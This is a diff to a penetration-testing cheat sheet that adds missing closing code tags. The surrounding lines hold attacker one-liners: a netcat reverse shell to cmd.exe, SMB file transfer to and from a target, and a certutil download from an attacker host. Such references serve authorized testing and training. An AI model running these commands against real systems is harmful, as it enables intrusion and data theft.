@@ -168,13 +168,13 @@ Windows: <code>nc.exe -nv [IP] [PORT] -e cmd.exe</code>
 
 Establish the SMB Share on Your Local Machine: <code>sudo impacket share .</code>
 
-Download (Local Machine -> Target Machine): <code>copy \\[LOCAL_IP]\share\[FILE] [C:\OUTPUT\LOCATION]
+Download (Local Machine -> Target Machine): <code>copy \\[LOCAL_IP]\share\[FILE] [C:\OUTPUT\LOCATION]</code>
 
-Upload (Target Machine -> Local Machine): <code> copy [FILE] \\[LOCAL_IP]\share\[FILE]
+Upload (Target Machine -> Local Machine): <code>copy [FILE] \\[LOCAL_IP]\share\[FILE]</code>
 
 ### Download Files with CertUtil (Windows)
 
-Download: <code>certutil -urlcache -f http/s://[LOCAL_IP]/[FILE] [C:\OUTPUT\LOCATION]
+Download: <code>certutil -urlcache -f http/s://[LOCAL_IP]/[FILE] [C:\OUTPUT\LOCATION]</code>
 
 ### Reverse Shells
 
